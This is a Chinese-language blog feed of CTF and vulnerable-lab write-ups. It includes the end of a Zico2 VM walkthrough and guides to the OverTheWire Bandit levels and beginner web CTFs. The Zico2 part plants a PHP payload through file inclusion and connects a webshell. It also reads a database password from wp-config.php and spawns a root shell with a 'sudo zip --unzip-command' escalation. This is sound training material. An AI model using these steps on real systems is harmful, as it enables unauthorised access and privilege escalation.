名称为hack.php2.在其中创建一个名为123的表 插入数据&lt;?php phpinfo()?&gt; 类型为TEXT3.(使用文件包含漏洞即可)想办法运行hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>搞完之后放在文件包含漏洞里测试效果<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br>这个页面就ok了<br>然后就都想得到嘛 用一句话代码 通过蚁剑连接<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>右键进入虚拟终端 在/home/zico/wordpress中查看wp-config.php的内容<br>发现一套密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/14.jpg" alt="14"></p><pre class="line-numbers language-none"><code class="language-none">/** MySQL database username */define('DB_USER', 'zico');/** MySQL database password */define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>账号为zico 密码为sWfCsfJSPV9H3AmQzw8<br>用这套密码和ssh登陆操作系统<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>登陆成功 使用sudo -l查看拥有sudo权限的命令 进行zip提权即可</p><pre class="line-numbers language-none"><code class="language-none">sudo zip 1.zip to_do.txt -T --unzip-command="sh -c /bin/bash"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/16.jpg" alt="16"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个集合了各方之长的靶机 流程很长<br>那我们下次再见！</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：zico2&lt;/p&gt;
&lt;h1 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h1&gt;&lt;p&gt;Poc Exp 和payload 的关系&lt;br&gt;dirb （网站目录扫描）&lt;br&gt;文件包含漏洞&lt;br&gt;mysql相关（虽然是图形化页面）&lt;br&gt;一句话木马+蚁剑&lt;br&gt;zip提权&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;p&gt;先把俩机子开开</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>OverTheWire-bandit解析</title>
    <link href="https://www.maonie.top/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/"/>
    <id>https://www.maonie.top/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/</id>
    <published>2024-03-21T08:50:52.000Z</published>
    <updated>2024-03-22T04:29:53.790Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="友情提示"><a href="#友情提示" class="headerlink" title="友情提示"></a>友情提示</h1><p>理论来说 这个网页的网站说了不允许剧透或是writeup<br>但这大多是为了方便我自身复习留下的资料<br>因此我不会直接在文中提供flag 只会写出方法与代码</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p><a href="https://overthewire.org/wargames/bandit/bandit0.html">网页链接</a><br>该网页类似一个在线靶场 需要你登录它所提供的账号密码登录其ssh服务进行一场小游戏<br>我使用了MobaXterm来登陆/输入指令</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><h2 id="level-0-准备"><a href="#level-0-准备" class="headerlink" title="level 0/准备"></a>level 0/准备</h2><blockquote><p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p></blockquote><p>页面描述为指示你链接ssh服务 并给予了对应ip 端口 账号 密码<br>一旦登录成功 便可进入level0→level1的页面<br>关于登录 我们先打开MobaXterm 点击左上角的 <strong>Session</strong> 选择ssh<br>输入ip地址<code>bandit.labs.overthewire.org</code>与端口2220<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>确认后左边的User sessions便会多出一个连接 右键 Edit session 会进入相同的页面<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>先点击① 会出来账号管理器 点击②来新建一个 输入bandit0与bandit0<br>保存好后在登陆前勾选左边的 <code>Specify username</code> 选择对应账号名即可快速登陆<br>注：使用MobaXterm的该功能必须设定一个高级密码 请不要忽视它跳出的窗口<br>每道题里的flag相当于下一题的账号密码<br>也就是说下道题的结论是 账号 <strong>bandit(题号)</strong> 与 密码 <strong>flag值</strong><br>这些即为前提 接下来正式入手</p><span id="more"></span><h2 id="level1-起始"><a href="#level1-起始" class="headerlink" title="level1/起始"></a>level1/起始</h2><blockquote><h1 id="Bandit-Level-0-→-Level-1"><a href="#Bandit-Level-0-→-Level-1" class="headerlink" title="Bandit Level 0 → Level 1"></a>Bandit Level 0 → Level 1</h1><h2 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>readme</strong> located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.</p><h2 id="Commands-you-may-need-to-solve-this-level"><a href="#Commands-you-may-need-to-solve-this-level" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>根据题目描述 在主目录下有名为readme的文件 查看该文件内容即可获取密码<br>既然是在主目录下 其实连ls都省了 直接 <code>cat readme</code>即可获取flag值</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><blockquote><h1 id="Bandit-Level-1-→-Level-2"><a href="#Bandit-Level-1-→-Level-2" class="headerlink" title="Bandit Level 1 → Level 2"></a>Bandit Level 1 → Level 2</h1><h2 id="Level-Goal-1"><a href="#Level-Goal-1" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>-</strong> located in the home directory</p><h2 id="Commands-you-may-need-to-solve-this-level-1"><a href="#Commands-you-may-need-to-solve-this-level-1" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>此关的目的是读取一个名为-的文件<br>由于-的名称与root根目录相同 直接cat或者加引号都无法读取<br>因此需要转为绝对路径<code>./-</code><br>输入<code>cat ./-</code>来获取flag值</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><h1 id="Bandit-Level-2-→-Level-3"><a href="#Bandit-Level-2-→-Level-3" class="headerlink" title="Bandit Level 2 → Level 3"></a>Bandit Level 2 → Level 3</h1><h2 id="Level-Goal-2"><a href="#Level-Goal-2" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>spaces in this filename</strong> located in the home directory</p><h2 id="Commands-you-may-need-to-solve-this-level-2"><a href="#Commands-you-may-need-to-solve-this-level-2" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>这关是考察通过cat获取文件名中有空格的文件内容<br>用引号来转义空格 使系统识别后部分为一个整体即可<br><code>cat ‘spaces in this filename’</code></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><blockquote><h1 id="Bandit-Level-3-→-Level-4"><a href="#Bandit-Level-3-→-Level-4" class="headerlink" title="Bandit Level 3 → Level 4"></a>Bandit Level 3 → Level 4</h1><h2 id="Level-Goal-3"><a href="#Level-Goal-3" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a hidden file in the <strong>inhere</strong> directory.</p><h2 id="Commands-you-may-need-to-solve-this-level-3"><a href="#Commands-you-may-need-to-solve-this-level-3" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>题目描述有一个被隐藏的文件藏在了inhere目录中 叫我们尝试读取<br>那就使用ls的-a附加项来查看隐藏文件<br>使用cd来切换目录</p><pre class="line-numbers language-none"><code class="language-none">cd inhere //切换至inhere目录ls -al //列出所有文件 显示隐藏文件并显示详细信息cat .hidden //查看文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote><h1 id="Bandit-Level-4-→-Level-5"><a href="#Bandit-Level-4-→-Level-5" class="headerlink" title="Bandit Level 4 → Level 5"></a>Bandit Level 4 → Level 5</h1><h2 id="Level-Goal-4"><a href="#Level-Goal-4" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the only human-readable file in the <strong>inhere</strong> directory. Tip: if your terminal is messed up, try the “reset” command.</p><h2 id="Commands-you-may-need-to-solve-this-level-4"><a href="#Commands-you-may-need-to-solve-this-level-4" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>inhere目录中唯一可读的文件才是我们追求的答案<br>我们查看下边提示中的命令列表 发现了file命令可用<br>经过搜索得知 Linux file命令用于辨识文件类型<br>注：文件名前加了- 无法正常读取 需要使用相对路径</p><pre class="line-numbers language-none"><code class="language-none">file ./* //显示同个目录下的所有文件的文件类型观察结果： ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显 只有-file07为ASII text形式 只需读取即可</p><pre class="line-numbers language-none"><code class="language-none">cat ./-file07<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote><h1 id="Bandit-Level-5-→-Level-6"><a href="#Bandit-Level-5-→-Level-6" class="headerlink" title="Bandit Level 5 → Level 6"></a>Bandit Level 5 → Level 6</h1><h2 id="Level-Goal-5"><a href="#Level-Goal-5" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file somewhere under the <strong>inhere</strong> directory and has all of the following properties:</p><ul><li>human-readable</li><li>1033 bytes in size</li><li>not executable</li></ul></blockquote><p>inhere目录中的指定文件存有flag 以下为flag文件的特征：<br>可读性 大小1033字节 无法运行<br>这里我们使用find命令的附加项即可</p><pre class="line-numbers language-none"><code class="language-none">find [路径] [匹配条件] [动作]-name pattern：按文件名查找，支持使用通配符 * 和 ?。-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。-user username：按文件所有者查找。-group groupname：按文件所属组查找。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入inhere目录 </p><pre class="line-numbers language-none"><code class="language-none">ls -altotal 88drwxr-x--- 22 root bandit5 4096 Oct  5 06:19 .drwxr-xr-x  3 root root    4096 Oct  5 06:19 ..drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere00drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere01drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere02drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere03drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere04drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere05drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere06drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere07drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere08drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere09drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere10drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere11drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere12drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere13drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere14drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere15drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere16drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere17drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere18drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下 我们使用find命令寻找目标文件</p><pre class="line-numbers language-none"><code class="language-none">find -size 1033c //在当前目录寻找大小为1033字节的文件./maybehere07/.file2cat ./maybehere07/.file2 //查看内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote><h1 id="Bandit-Level-6-→-Level-7"><a href="#Bandit-Level-6-→-Level-7" class="headerlink" title="Bandit Level 6 → Level 7"></a>Bandit Level 6 → Level 7</h1><h2 id="Level-Goal-6"><a href="#Level-Goal-6" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p><ul><li>owned by user bandit7</li><li>owned by group bandit6</li><li>33 bytes in size</li></ul></blockquote><p>这次直接没有指定目录了<br>给的目标文件特征为：<br><strong>文件所属者bandit7</strong><br><strong>文件所属组bandit6</strong><br><strong>大小33字节</strong><br>刚刚也给了相关的附加项 这里直接进行搜索 </p><pre class="line-numbers language-none"><code class="language-none">find / -user bandit7 -group bandit6 -size 33c//以整个电脑范围寻找文件所属者为bandit7 文件所属组为bandit6 大小为33字节的文件/var/lib/dpkg/info/bandit7.passwordcat /var/lib/dpkg/info/bandit7.password //查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><blockquote><h1 id="Bandit-Level-7-→-Level-8"><a href="#Bandit-Level-7-→-Level-8" class="headerlink" title="Bandit Level 7 → Level 8"></a>Bandit Level 7 → Level 8</h1><h2 id="Level-Goal-7"><a href="#Level-Goal-7" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p><h2 id="Commands-you-may-need-to-solve-this-level-5"><a href="#Commands-you-may-need-to-solve-this-level-5" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/man.1.html">man</a>, grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>密码在data.txt之中 字符串靠近millionth<br>我们这里使用uniq命令来寻找data.txt中没有重复的行列</p></blockquote><pre class="line-numbers language-none"><code class="language-none">uniq data.txt|grep millionth//删除data.txt中的重复行 并筛选出有millionth的那行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>密码直接就出来了</p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><blockquote><h1 id="Bandit-Level-8-→-Level-9"><a href="#Bandit-Level-8-→-Level-9" class="headerlink" title="Bandit Level 8 → Level 9"></a>Bandit Level 8 → Level 9</h1><h2 id="Level-Goal-8"><a href="#Level-Goal-8" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p><h2 id="Commands-you-may-need-to-solve-this-level-6"><a href="#Commands-you-may-need-to-solve-this-level-6" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>和上题相似 但要找的是只出现过一次的内容<br>需要使用与uniq相似的sort命令来一起助力<br>同时使用uniq的附加项-u来显示仅显示出一次的行列</p><pre class="line-numbers language-none"><code class="language-none">sort data.txt|uniq -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><blockquote><h1 id="Bandit-Level-9-→-Level-10"><a href="#Bandit-Level-9-→-Level-10" class="headerlink" title="Bandit Level 9 → Level 10"></a>Bandit Level 9 → Level 10</h1><h2 id="Level-Goal-9"><a href="#Level-Goal-9" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, preceded by several ‘=’ characters.</p><h2 id="Commands-you-may-need-to-solve-this-level-7"><a href="#Commands-you-may-need-to-solve-this-level-7" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>这题要用到strings命令输出文件中可打印的字符 并筛选出与等号相接的</p><pre class="line-numbers language-none"><code class="language-none">strings data.txt|grep =<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><blockquote><h1 id="Bandit-Level-10-→-Level-11"><a href="#Bandit-Level-10-→-Level-11" class="headerlink" title="Bandit Level 10 → Level 11"></a>Bandit Level 10 → Level 11</h1><h2 id="Level-Goal-10"><a href="#Level-Goal-10" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p><h2 id="Commands-you-may-need-to-solve-this-level-8"><a href="#Commands-you-may-need-to-solve-this-level-8" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>data.txt中的密码经过base64加密 解密即可</p><pre class="line-numbers language-none"><code class="language-none">base64 -d data.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><blockquote><h1 id="Bandit-Level-11-→-Level-12"><a href="#Bandit-Level-11-→-Level-12" class="headerlink" title="Bandit Level 11 → Level 12"></a>Bandit Level 11 → Level 12</h1><h2 id="Level-Goal-11"><a href="#Level-Goal-11" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p><h2 id="Commands-you-may-need-to-solve-this-level-9"><a href="#Commands-you-may-need-to-solve-this-level-9" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>该密码经过凯撒密码(偏移量13)加密 放在网站里解密即可<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/4.jpg" alt="4"></p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;友情提示&quot;&gt;&lt;a href=&quot;#友情提示&quot; class=&quot;headerlink&quot; title=&quot;友情提示&quot;&gt;&lt;/a&gt;友情提示&lt;/h1&gt;&lt;p&gt;理论来说 这个网页的网站说了不允许剧透或是writeup&lt;br&gt;但这大多是为了方便我自身复习留下的资料&lt;br&gt;因此我不会直接在文中提供flag 只会写出方法与代码&lt;/p&gt;
&lt;h1 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; title=&quot;环境介绍&quot;&gt;&lt;/a&gt;环境介绍&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://overthewire.org/wargames/bandit/bandit0.html&quot;&gt;网页链接&lt;/a&gt;&lt;br&gt;该网页类似一个在线靶场 需要你登录它所提供的账号密码登录其ssh服务进行一场小游戏&lt;br&gt;我使用了MobaXterm来登陆&amp;#x2F;输入指令&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;h2 id=&quot;level-0-准备&quot;&gt;&lt;a href=&quot;#level-0-准备&quot; class=&quot;headerlink&quot; title=&quot;level 0&amp;#x2F;准备&quot;&gt;&lt;/a&gt;level 0&amp;#x2F;准备&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;页面描述为指示你链接ssh服务 并给予了对应ip 端口 账号 密码&lt;br&gt;一旦登录成功 便可进入level0→level1的页面&lt;br&gt;关于登录 我们先打开MobaXterm 点击左上角的 &lt;strong&gt;Session&lt;/strong&gt; 选择ssh&lt;br&gt;输入ip地址&lt;code&gt;bandit.labs.overthewire.org&lt;/code&gt;与端口2220&lt;br&gt;&lt;img data-src=&quot;/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/1.jpg&quot; alt=&quot;1&quot;&gt;&lt;br&gt;确认后左边的User sessions便会多出一个连接 右键 Edit session 会进入相同的页面&lt;br&gt;&lt;img data-src=&quot;/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/2.jpg&quot; alt=&quot;2&quot;&gt;&lt;br&gt;先点击① 会出来账号管理器 点击②来新建一个 输入bandit0与bandit0&lt;br&gt;保存好后在登陆前勾选左边的 &lt;code&gt;Specify username&lt;/code&gt; 选择对应账号名即可快速登陆&lt;br&gt;注：使用MobaXterm的该功能必须设定一个高级密码 请不要忽视它跳出的窗口&lt;br&gt;每道题里的flag相当于下一题的账号密码&lt;br&gt;也就是说下道题的结论是 账号 &lt;strong&gt;bandit(题号)&lt;/strong&gt; 与 密码 &lt;strong&gt;flag值&lt;/strong&gt;&lt;br&gt;这些即为前提 接下来正式入手&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF实战相关2</title>
    <link href="https://www.maonie.top/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/"/>
    <id>https://www.maonie.top/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/</id>
    <published>2024-03-12T10:08:17.000Z</published>
    <updated>2024-03-12T10:09:45.548Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="CTF实战相关2"><a href="#CTF实战相关2" class="headerlink" title="CTF实战相关2"></a>CTF实战相关2</h1><p>以web类的CTF作为范本的话<br>应该做的</p><blockquote><p>1.检查网页元素  寻找相关提示<br>2.通过网络查看http标头(header)<br>3.burp扫描/hackbar投送信息/更改cookie<br>4.php相关知识</p></blockquote><p>还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer<br>简单来说<br>X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问<br>Referer代表了你是从哪个网页来——例如<code>http://www.google.com</code></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>（注：这里图片只附上结果 主要是不想再开环境了）<br>使用了谷歌浏览器的f12功能 burpsuite 与 firefox的hackbar插件</p><span id="more"></span><h4 id="1-BugKu-Web-计算器"><a href="#1-BugKu-Web-计算器" class="headerlink" title="1.BugKu-Web-计算器"></a>1.BugKu-Web-计算器</h4><p>检查html元素 发现页面中的答题框只允许输一个数字 无法正确回答<br>更改input框中限制的文字上限 成功作答 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/1.jpg" alt="1"></p><h4 id="2-攻防世界-Web新手区-disabled-button"><a href="#2-攻防世界-Web新手区-disabled-button" class="headerlink" title="2.攻防世界-Web新手区- disabled_button"></a>2.攻防世界-Web新手区- disabled_button</h4><p>检查html元素 发现页面中显示“一个不能按的按钮”  多半按下后才能显示flag<br>删去按钮属性框中的<code>disabled</code> 按下按钮 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/2.jpg" alt="2"></p><h4 id="3-BugKu-Web-头等舱"><a href="#3-BugKu-Web-头等舱" class="headerlink" title="3.BugKu-Web-头等舱"></a>3.BugKu-Web-头等舱</h4><p>检查页面 f12发现无标注隐藏元素 根据题目名“头等舱” 通过f12-网络<br>f5刷新后从网络标头中找到flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/3.jpg" alt="3"></p><h4 id="4-攻防世界-Web-baby-web"><a href="#4-攻防世界-Web-baby-web" class="headerlink" title="4.攻防世界-Web-baby_web"></a>4.攻防世界-Web-baby_web</h4><p>检查页面 发现无隐藏元素 根据作者提示<code>想想主页面是什么</code>访问目录index.php<br>然而index.php也无任何隐藏<br>最终 通过f12-网络 f5刷新后从该页面的网络标头中找到flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/4.jpg" alt="4"></p><h4 id="5-（BUUCTF）极客大挑战-2019-Havefun"><a href="#5-（BUUCTF）极客大挑战-2019-Havefun" class="headerlink" title="5.（BUUCTF）极客大挑战-2019-Havefun"></a>5.（BUUCTF）极客大挑战-2019-Havefun</h4><p>检查页面 元素中有标注代码 该页面GET方式接收cat参数<br>当cat=dog时会发生什么 于是传参 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/5.jpg" alt="5"></p><h4 